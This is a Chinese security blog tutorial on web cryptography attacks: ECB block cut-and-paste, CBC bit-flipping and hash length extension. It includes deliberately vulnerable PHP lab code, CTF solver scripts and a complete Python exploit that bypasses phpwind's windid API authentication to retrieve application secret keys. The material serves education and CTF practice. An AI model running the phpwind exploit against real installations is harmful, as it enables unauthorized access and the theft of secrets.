> 原文链接: https://www.anquanke.com//post/id/84724 


# 【技术分享】常见的Web密码学攻击方式汇总


                                阅读量   
                                **215374**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



**[![](https://p3.ssl.qhimg.com/t016d33e61ad6639bb3.png)](https://p3.ssl.qhimg.com/t016d33e61ad6639bb3.png)**

****

**作者：**[**Faith4444**](http://bobao.360.cn/member/contribute?uid=2664026655)

**稿费：500RMB（不服你也来投稿啊！）**

**投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿**



**写在前面**

所有脚本的导图都是自己写的、画的，如果有不好的地方多多包涵，错误的地方也请指出，谢谢。

<br>

**分组密码的模式**

分组密码每次只能处理加密固定长度的分组，但是我们加密的明文可能会超过分组密码处理的长度。

这时便需要对所有分组进行迭代，而迭代的方式被称为分组密码的模式。常见的为针对ECB、CBC模式攻击(L-ctf提到其中一种)。

<br>

**ECB**

ECB模式的全称是Electronic CodeBook模式，将明文分组加密后直接成为密文分组，而密文则是由明文分组直接拼接而成，如图所示：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0168aa2cc537427817.png)

 <br>

**Features：**

ECB模式是所有模式中最简单的一种。明文分组和密文分组是一一对应的，如果明文分组有相同的那么最后的密文中也会有相同的密文分组。

因为每个分组都独自进行加密解密，所以无需破解密文就能操纵部分明文，或者改变明文，在不知道加密算法的情况下得到密文，从而达到攻击效果，如图所示（翻转密文分组，那么明文分组也会被翻转）

[![](https://p1.ssl.qhimg.com/t01024785d698fecbb5.png)](https://p1.ssl.qhimg.com/t01024785d698fecbb5.png)

**Example：**

某次CTF遇到的题目

[![](https://p5.ssl.qhimg.com/t01789de61f6c6d3726.png)](https://p5.ssl.qhimg.com/t01789de61f6c6d3726.png)

**思路：**以administrator权限登陆就就能获得Flag。判断权限则是根据cookie里面的uid参数，cookie包含username和uid两个参数，均为使用ECB加密的密文，然而username的密文是根据注册时的明文生成的。

因此我们可以根据username的明文操纵生成我们想要的uid的密文。经过fuzz发现明文分组块为16个字节，那么我们注册17字节的用户，多出的那一个字节就可以是我们我们希望的UID的值，而此时我们查看username的密文增加部分就是UID的密文，即可伪造UID。

注册aaaaaaaaaaaaaaaa1获得1的密文分组,注册aaaaaaaaaaaaaaaa2获得2的密文分组，以此类推

源码没找到，好像弄丢了，自己写了个差不多的,有兴趣可以练习

[![](https://p5.ssl.qhimg.com/t01a11d47cc752fbf4f.png)](https://p5.ssl.qhimg.com/t01a11d47cc752fbf4f.png)

[![](https://p5.ssl.qhimg.com/t0178b14faa0fa66669.png)](https://p5.ssl.qhimg.com/t0178b14faa0fa66669.png)

**ebc.php：**



```
&lt;?php
function AES($data)`{`
    $privateKey = "12345678123456781234567812345678";
    $encrypted = mcrypt_encrypt(MCRYPT_RIJNDAEL_128, $privateKey, $data, MCRYPT_MODE_ECB);
    $encryptedData = (base64_encode($encrypted));
    return $encryptedData;
`}`
function DE__AES($data)`{`
    $privateKey = "12345678123456781234567812345678";
    $encryptedData = base64_decode($data);
    $decrypted = mcrypt_decrypt(MCRYPT_RIJNDAEL_128, $privateKey, $encryptedData, MCRYPT_MODE_ECB);
    $decrypted = rtrim($decrypted, "") ;
    return $decrypted;
`}`
if (@$_GET['a']=='reg')`{`
    setcookie('uid', AES('9'));
    setcookie('username', AES($_POST['username']));
    header("Location: http://127.0.0.1/ecb.php");
    exit();
`}`
if (@!isset($_COOKIE['uid'])||@!isset($_COOKIE['username']))`{`
    echo '&lt;form method="post" action="ecb.php?a=reg"&gt;
Username:&lt;br&gt;
&lt;input type="text"  name="username"&gt;
&lt;br&gt;
Password:&lt;br&gt;
&lt;input type="text" name="password" &gt;
&lt;br&gt;&lt;br&gt;
&lt;input type="submit" value="注册"&gt;
&lt;/form&gt; ';
`}`
else`{`
    $uid = DE__AES($_COOKIE['uid']);
    if ( $uid != '4')`{`
        echo 'uid:' .$uid .'&lt;br/&gt;';
        echo 'Hi ' . DE__AES($_COOKIE['username']) .'&lt;br/&gt;';
        echo 'You are not administrotor!!';
    `}`
    else `{`
          echo "Hi you are administrotor!!" .'&lt;br/&gt;';
        echo 'Flag is 360 become better';
    `}`
`}`
?&gt;
```

**ecb.py：**



```
#coding=utf-8
import urllib
import urllib2
import base64
import cookielib
import Cookie
for num in range(1,50):
    reg_url='http://127.0.0.1/ecb.php?a=reg'
    index_url='http://127.0.0.1/ecb.php'
    cookie=cookielib.CookieJar()
    opener=urllib2.build_opener(urllib2.HTTPCookieProcessor(cookie))
    opener.addheaders.append(('User-Agent','Mozilla/5.0'))
    num=str(num)
    values=`{`'username':'aaaaaaaaaaaaaaaa'+num,'password':'123'`}`
    data=urllib.urlencode(values)
    opener.open(reg_url,data)
    text=opener.open(index_url,data)
    for ck in cookie:
        if ck.name=='username':
            user_name=ck.value
    user_name = urllib.unquote(user_name)
    user_name = base64.b64decode(user_name)
    hex_name = user_name.encode('hex')
    hex_name = hex_name[len(hex_name)/2:]
    hex_name = hex_name.decode('hex')
    uid = base64.b64encode(hex_name)
    uid = urllib.quote(uid)
    for ck in cookie:
        if ck.name=='uid':
            ck.value=uid
    text=opener.open(index_url).read()
    if 'Flag' in text:
        print text
        break
    else:
       print num
```



**CBC**

CBC模式的全称是Cipher Block Chaining模式,在此模式中，先将明文分组与前一个密文分组(或为初始化向量IV)进行XOR运算，然后再进行加密。

解密则为密文分组先进行解密，然后再进行xor运算得到明文分组，解密过程如图所示(加密则相反)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t010e3dd3703719ebbe.png)

**Features：**

因为CBC模式是将前一个密文分组和明文分组进行混合加密所以，是可以避免ECB模式的弱点。

但正因为如此，导致了解密时修改前一个密文分组就可以操纵后一个的解密后的明文分组，可以将前一个密文中的任意比特进行修改（0,1进行互换，也可以叫翻转）

因此CBC模式有两个攻击点：①vi向量，影响第一个明文分组 ②第n个密文分组，影响第n+1个明文分组

**Example：**

在比赛中遇到过很多次，基本上属于对一个密文分组进行翻转之后能够提升权限或者绕过验证的作用，自己写了一个差不多的，攻击密文的，大家可以看看

[![](https://p3.ssl.qhimg.com/t0177a2f4fc3258417b.png)](https://p3.ssl.qhimg.com/t0177a2f4fc3258417b.png)

大概就是这样，要获得FLAG需要让ID=0，而我们是可以从URL中知道密文的

http://127.0.0.1/cbc2.php?a=89b52bac0331cb0b393c1ac828b4ee0f07861f030a8a3dc4b6e786f473b52182000a0d4ce2145994573a92d257a514d1

我们现在要对密文进行翻转攻击，但是并不清楚哪部分对应的是ID的上一个密文，可以直接脚本进行FUZZ，也可是使用burp(intruder)进行测试（选择攻击的密文）

[![](https://p3.ssl.qhimg.com/t01e9c1d3dc9d43d17f.png)](https://p3.ssl.qhimg.com/t01e9c1d3dc9d43d17f.png)

选择攻击模式

[![](https://p2.ssl.qhimg.com/t01940867d07e3e8e51.png)](https://p2.ssl.qhimg.com/t01940867d07e3e8e51.png)

攻击结果

[![](https://p3.ssl.qhimg.com/t017d05ac3177472dcf.png)](https://p3.ssl.qhimg.com/t017d05ac3177472dcf.png)

burp的翻转并不是遍历所有翻转的可能每一位变动一次，比如101101的第一次为101100，那么的二次就是101110，第三次是101000，依次类推。

所以burp可能无法完全翻转出需要的payload，但是可以帮我确定需要翻转的位置，我们经过简单的计算就能得到自己需要的值

[![](https://p4.ssl.qhimg.com/t018fd370547bc4259d.png)](https://p4.ssl.qhimg.com/t018fd370547bc4259d.png)

比如这里进过对比，我们轻松的找到了需要翻转的位置，但是却没有得到为0的翻转，数学不及格的我来算算。xor运算的特点:a xor b =c abc三个数任意两个运算可得到第三个，所以

0b的10进制是11

11xor5=14

14xor0=14

14的十进制为0e

[![](https://p5.ssl.qhimg.com/t010c7965026ebc73d4.png)](https://p5.ssl.qhimg.com/t010c7965026ebc73d4.png)

FUZZ反转成功。

最后在提醒下：AES128位一组，换成16进制其实我们反转的的是第一组。但影响的却是第二组

[![](https://p0.ssl.qhimg.com/t01956aa2f58441757e.png)](https://p0.ssl.qhimg.com/t01956aa2f58441757e.png)

我们这个演示的是攻击密文的，攻击iv的，基本相似，有兴趣的可以去看看OWASP里面的，那个是攻击iv的

**cbc.php：**



```
&lt;?php  
$cipherText = $_GET['a'];//89b52bac0331cb0b393c1ac828b4ee0f07861f030a8a3dc4b6e786f473b52182000a0d4ce2145994573a92d257a514d1
$padkey = hex2bin('66616974683434343407070707070707');
$iv = hex2bin('f4ebb2df9c29efd7625561a15096cd24');
$td = mcrypt_module_open(MCRYPT_RIJNDAEL_128, '', MCRYPT_MODE_CBC, '');    
if (mcrypt_generic_init($td, $padkey, $iv) != -1)    
`{`    
    $p_t = mdecrypt_generic($td, hex2bin($cipherText));    
    mcrypt_generic_deinit($td);    
    mcrypt_module_close($td);
    $p_t = trimEnd($p_t);
    $tmp = explode(':',$p_t);
    if ($tmp[2]=='0')`{`
        print @'id:'.@$tmp[2].'&lt;br/&gt;';
         echo 'Flag is T00ls become better';
    `}`
    else`{`
echo 'Your are noob!fuck noob!!';
        echo @'&lt;br/&gt;id:'.@$tmp[2].'&lt;br/&gt;';
        echo @'name:'.@$tmp[0].'&lt;br/&gt;';
        echo @'email:'.@$tmp[1].'&lt;br/&gt;';
    `}`
`}`     
function pad2Length($text, $padlen)`{`    
    $len = strlen($text)%$padlen;    
    $res = $text;    
    $span = $padlen-$len;
    for($i=0; $i&lt;$span; $i++)`{`    
        $res .= chr($span);    
    `}`
    return $res;    
`}`
function trimEnd($text)`{`    
    $len = strlen($text);    
    $c = $text[$len-1];    
    if(ord($c) &lt;$len)`{`    
        for($i=$len-ord($c); $i&lt;$len; $i++)`{`    
            if($text[$i] != $c)`{`    
                return $text;    
            `}`    
        `}`    
        return substr($text, 0, $len-ord($c));    
    `}`    
    return $text;    
`}`
```



**Hash-Length-Extension-Attack**

许多算法都使用的Merkle–Damgård construction,比如MD5，和SHA-1等，因此这些算法都受到Length-Extension-Attack。

要说清这个攻击原理，我们还是简单说说SHA-1

**Features：**

SHA-1处理消息前会先对消息进行填充，使整个消息成为512比特的整数倍，每个分组均为512比特

①填充(Padding)，方式为将多余的消息后面加一位，且为1，然后后面全部使用0填充使整个分组变为448比特，而最后的64比特会记录原始消息的长度，填充后每个分组均为512比特。

②然后就是复杂的数学计算~_~我也看的不是特别懂，但是并不影响我们理解。简单说说就行，首先会定义5个32比特的值（缓冲区初始值，是不是加起来刚好160比特~~，可以理解为iv），

然后大概就是每个分组会经过了80步的处理，然后会输出新的5个32比特的值，这个时候我们可以理解原始消息已经充分混入这160比特里面，再用这5个数作为初始值去去处理下一个分组,依次类推，最后得到的hash其实就是这5个数，可以看看我画的便于理解的草图：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01fe0a38fff8111c10.png)

**Example：**

Hash-Length-Extension-Attack ，可以在知道MD5(message)的hash值得情况下，算出MD5(message+padding+a)的hash值，就是根据短的消息的hash算出更长的消息的hash。

为什么呢，其实看了上面的图就会觉得很简单了。我们把hash反排序一下不久又得到5个新的32个比特值吗（此处是可以逆向MD5的算法的），我们可以用这5个数继续消息混合，而我们之前padding的数据就会成为整个消息的一部分说以能够算出MD5(message+padding+a)，a就是我们要继续混合的消息。

这类漏洞一般出现在CTF中比较多，类型都是费否等于MAC == hash(message+test)  message未知或者只知晓一部分，不过都不重要，重要是的message的长度，因为会影响到拓展后的消息，不知道的话就需要爆破，然后test位置可控，这样才能拓展，MAC一般也是可控，校验通过就能下一步哈哈，或者拿flag。

之前我们都是看的CTF(L-ctf也有一部分，拓展后可以下载压缩包)，我们就来看看phpwind的MD5 padding 漏洞

其实是windidserver接口验证缺陷，用扩展攻击绕过验证就可以执行接口中的其他控制器中的其他方法~~

这个函数会在执行控制其方法之前执行，进行验证，然而我们发现$_windidkey可以自己输入，只要是appkey的结果相等就能通过验证



```
public  function beforeAction($handlerAdapter) `{`
  parent::beforeAction($handlerAdapter);
  $charset = 'utf-8';
  $_windidkey = $this-&gt;getInput('windidkey', 'get');
  $_time = (int)$this-&gt;getInput('time', 'get');
  $_clientid = (int)$this-&gt;getInput('clientid', 'get');
  if (!$_time || !$_clientid) $this-&gt;output(WindidError::FAIL);
  $clent = $this-&gt;_getAppDs()-&gt;getApp($_clientid);
  if (!$clent) $this-&gt;output(WindidError::FAIL);
  if (WindidUtility::appKey($clent['id'], $_time, $clent['secretkey'], $this-&gt;getRequest()-&gt;getGet(null), $this-&gt;getRequest()-&gt;getPost()) != $_windidkey)  $this-&gt;output(WindidError::FAIL);
  $time = Pw::getTime();
  if ($time - $_time &gt; 1200) $this-&gt;output(WindidError::TIMEOUT);
  $this-&gt;appid = $_clientid;
 `}`
```

既然都已经说了是这类型的漏洞，那我们肯定就要找能找到的hash

showFlash这里满足要求（打印出了hash  822382cb79f915c779943a1dc131f00c）



```
public function showFlash($uid, $appId, $appKey, $getHtml = 1) `{`
$time = Pw::getTime();
$key = WindidUtility::appKey($appId, $time, $appKey, array('uid'=&gt;$uid, 'type'=&gt;'flash', 'm'=&gt;'api', 'a'=&gt;'doAvatar', 'c'=&gt;'avatar'), array('uid'=&gt;'undefined'));
$key2 = WindidUtility::appKey($appId, $time, $appKey, array('uid'=&gt;$uid, 'type'=&gt;'normal', 'm'=&gt;'api', 'a'=&gt;'doAvatar', 'c'=&gt;'avatar'), array());
```

我们再跟踪appkey



```
public static function appKey($apiId, $time, $secretkey, $get, $post) `{`
// 注意这里需要加上__data，因为下面的buildRequest()里加了。
$array = array('windidkey', 'clientid', 'time', '_json', 'jcallback', 'csrf_token',
   'Filename', 'Upload', 'token', '__data');
$str = '';
ksort($get);
ksort($post);
foreach ($get AS $k=&gt;$v) `{`
if (in_array($k, $array)) continue;
$str .=$k.$v;
`}`
foreach ($post AS $k=&gt;$v) `{`
if (in_array($k, $array)) continue;
$str .=$k.$v;
`}`
return md5(md5($apiId.'||'.$secretkey).$time.$str);
`}`
```

经过各种排序，我们可以得出这个hash的值和消息的结构

822382cb79f915c779943a1dc131f00c = md5（md5().$time.$str）

822382cb79f915c779943a1dc131f00c= md5 +1475841959 + adoAvatarcavatarmapitypeflashuid2uidundefined

里面的md5值不知道，但是是32位，$time.$str都是可控，那么我们就可以拓展这个消息，得到新的hash,而调用这个函数进行验证的得地方自然也就绕过了验证  $_windidkey我们只要传入拓展后的hash即可绕过。因为我们拓展时必须保持md5 +1475841959 + adoAvatarcavatarmapitypeflashuid2uidundefined的结构，然而排序的时候回因为传入的a(action)参数导致打乱循序，无法扩展，但是因为phpwind的路由支持post,所以post一下控制器(c)，模块(m)，动作(a)这三个参数

$_windidkey（我们拓展的hash）== md5 +1475841959 + adoAvatarcavatarmapitypeflashuid2uidundefined +padding +alistcappmapi(post排序的)正好绕过验证

填写一下cookie和url就可以获得secretkey（调用的list方法，要实现其他action自行修改，getshell就暂不讨论，这不是我们这里的重点



```
#coding=utf-8
import urllib
import urllib2
import time
import cookielib
import gzip
import StringIO
from bs4 import BeautifulSoup
import re
import hashpumpy
import sys
reload(sys)
sys.setdefaultencoding('utf-8')
def get_key(url):
    url = url + '/?m=profile&amp;c=avatar&amp;_left=avatar'
    response = opener.open(url)
    html = response.read()
    if response.info().get('Content-Encoding') == 'gzip':
        stream = StringIO.StringIO(html)
        with gzip.GzipFile(fileobj=stream) as f:
            html = f.read()
    soup = BeautifulSoup(html, 'lxml')
    key_url = soup.find('param',attrs=`{`'name':'FlashVars'`}`).get('value')
    key_url = urllib.unquote(key_url)
    rule = 'uid=(.+?)&amp;windidkey=(.+?)&amp;time=(.+?)&amp;clientid=(.+?)&amp;type'
    Pattern = re.compile(rule, re.S)
    rs = re.findall(Pattern, key_url)
    return rs[0]
def padding_exten(windidkey,time,uid):
    hexdigest = windidkey
    original_data = time+'adoAvatarcavatarmapitypeflashuid'+uid+'uidundefined'
    data_to_add = 'alistcappmapi'
    key_length = 32    
    result = list()
    rs = hashpumpy.hashpump(hexdigest,original_data,data_to_add,key_length)
    result.append(rs[0])
    tmp = str(rs)
    tmp = tmp.split(',')[1]
    tmp = tmp.split("'")[1]
    tmp = tmp.replace('\x','%')   
    rule = 'undefined(.+?)alist'
    Pattern = re.compile(rule, re.S)
    tmp = re.findall(Pattern, tmp)
    result.append(tmp[0]) 
    return result
if __name__ == '__main__':
    url = 'http://192.168.0.100/phpwind'
    cookie = 'CNZZDATA1257835621=169451052-1472798292-null%7C1472798292; PHPSESSID=5adaadb063b4208acd574d3d044dda38; ECS[visit_times]=5; csrf_token=ab686222777d7f80; xzr_winduser=PbUcCS1OT1ZjCzY8GoJOV8EOvix9OdGpc%2BmWBPYV6ar07B7AZSOhSw%3D%3D; xzr_lastvisit=7%091475751418%09%2Fphpwind%2F%3Fm%3Dprofile%26c%3Davatar%26_left%3Davatar; xzr_visitor=cx59FPbNJ4FYG2e9cWKpUP%2FTZTef7Yu4DTFLTftwwZ%2FPEVo8'
    cj = cookielib.CookieJar()
    opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
    opener.addheaders.append(
        ('User-Agent', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0'))
    opener.addheaders.append(('Accept', '*/*'))
    opener.addheaders.append(('Accept-Language', 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3'))
    opener.addheaders.append(('Accept-Encoding', 'gzip, deflate'))
    opener.addheaders.append(('Connection', 'keep-alive'))
    opener.addheaders.append(('Cookie', cookie))
    opener.addheaders.append(('Cache-Control', 'max-age=0'))
    uid, windidkey, time, clientid = get_key(url)
    windidkey, padding = padding_exten(windidkey,time,uid)
    payload = '/windid/index.php?time='+time+'&amp;windidkey='+windidkey+'&amp;clientid='+clientid+'&amp;adoAvatarcavatarmapitypeflashuid'+uid+'uidundefined='+padding
    url = url + payload
    data = `{`'m':'api','c':'app','a':'list'`}`
    data = urllib.urlencode(data)
    response = opener.open(url,data)
    html = response.read()
    if response.info().get('Content-Encoding') == 'gzip':
        stream = StringIO.StringIO(html)
        with gzip.GzipFile(fileobj=stream) as f:
            html = f.read()
    print html
```



**后记**

小弟自己的理解，如果有错误的地方欢迎指正。
